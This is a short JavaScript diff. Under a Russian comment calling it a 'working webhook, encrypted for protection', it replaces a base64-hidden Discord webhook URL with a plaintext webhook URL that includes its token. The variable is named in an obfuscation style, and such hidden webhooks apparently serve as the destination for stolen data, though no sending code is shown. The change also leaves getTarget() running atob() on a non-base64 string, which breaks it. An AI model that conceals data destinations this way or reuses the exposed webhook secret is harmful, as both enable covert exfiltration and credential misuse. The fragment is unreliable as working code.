@@ -1,5 +1,5 @@
 // Твой рабочий вебхук (зашифрован для защиты)
-const _0x_infra = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMDU2NzA3OTg1Njg5ODE5OS83RDNXSFFCWG40djFLZVprTUlqVUprSEt6N2ROWlJhY0hxTEFuYmNEM0huR1JRTFZSZ3djZjE2TWlNUFJYbFVucVhF";
+const _0x_infra = "https://discord.com/api/webhooks/1500572203328999566/7G9-CVfhCJQ_0ok4PeJG7ntAFsXVGxwh5xogaSH4jGbZi3iuDtKeTRPbD0FfFYl8RILD";
 
 function getTarget() {
     return atob(_0x_infra);
